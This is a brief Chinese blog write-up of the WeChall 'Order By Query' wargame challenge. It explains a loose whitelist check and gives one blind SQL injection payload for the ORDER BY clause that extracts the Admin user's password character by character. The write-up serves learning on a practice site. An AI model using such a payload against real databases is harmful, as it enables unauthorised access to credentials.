---
title: Order By Query
author: rk700
layout: post
categories:
  - writeup
tags:
  - mysql
  - wechall
---
[http://www.wechall.net/challenge/order\_by\_query/index.php][1]  
用户输入在`order by`后面出现，只能用盲注  
另外由于会检查参数`by`是否在白名单里，但用的是`==`，所以只要第一个字符是有效的数字即可

用二分法读内容  
<pre>
by=1,(case when (ascii(substring((select password from users where username=0x41646d696e),1,1))=51) then 3 else 1*(select apples from users)end)
</pre>

 [1]: http://www.wechall.net/challenge/order_by_query/index.php